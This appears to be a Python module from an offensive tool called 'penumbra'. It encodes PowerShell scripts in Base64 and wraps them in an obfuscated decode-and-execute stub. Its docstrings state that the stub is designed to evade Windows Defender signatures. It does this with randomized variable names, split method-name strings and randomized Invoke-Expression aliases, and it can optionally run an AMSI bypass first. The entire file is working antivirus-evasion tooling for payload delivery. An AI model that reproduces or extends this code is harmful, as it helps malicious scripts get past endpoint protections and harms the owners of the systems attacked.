"""PS1 Base64 encode pass — wraps script in obfuscated decode + execution stub.

Avoids well-known IEX cradle patterns that Defender signatures match on.
Uses variable indirection and split method names to break static signatures.
"""

from __future__ import annotations

import base64
import secrets

from penumbra.types import PassConfig


def _rand_var() -> str:
    return "_" + secrets.token_hex(3)


class Base64EncodePass:
    """Encode a PS1 script as UTF-8 Base64 with an obfuscated decoder stub.

    If config.extra["amsi_technique"] is set, the AMSI bypass is
    encoded and executed first via variable indirection.
    """

    @property
    def name(self) -> str:
        return "encode"

    def apply(self, data: bytes, config: PassConfig) -> bytes:
        payload_b64 = base64.b64encode(data).decode("ascii")

        # Build obfuscated decoder stub — avoid the well-known pattern:
        #   [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('...'))
        # Instead use variable indirection and split type/method references.
        lines: list[str] = []

        # If AMSI technique configured, encode and execute the bypass first
        technique = config.extra.get("amsi_technique")
        if technique:
            from penumbra.ps.amsi import _GENERATORS

            gen = _GENERATORS.get(str(technique))
            if gen:
                bypass_b64 = base64.b64encode(
                    gen().encode("utf-8")
                ).decode("ascii")
                lines.extend(_obfuscated_decode_exec(bypass_b64))
                lines.append("")

        # Decode and execute the main payload
        lines.extend(_obfuscated_decode_exec(payload_b64))

        return "\n".join(lines).encode("utf-8")


def _obfuscated_decode_exec(b64_data: str) -> list[str]:
    """Generate obfuscated Base64 decode + IEX using variable indirection."""
    v_enc = _rand_var()
    v_raw = _rand_var()
    v_txt = _rand_var()

    # Split the decode into steps with randomized variable names.
    # Use [Convert] and [Text.Encoding] via variables to break signatures.
    return [
        f"${v_enc} = '{b64_data}'",
        f"${v_raw} = [Convert]::('FromB'+'ase64S'+'tring')(${v_enc})",
        f"${v_txt} = [Text.Encoding]::UTF8.('GetSt'+'ring')(${v_raw})",
        f".({_rand_iex()}) ${v_txt}",
    ]


def _rand_iex() -> str:
    """Generate a randomized Invoke-Expression alias."""
    # PowerShell resolves these at runtime via the command lookup
    variants = [
        "'Invoke-'+'Expression'",
        "'In'+'voke'+'-Ex'+'pression'",
        "'iex'",
    ]
    return secrets.choice(variants)
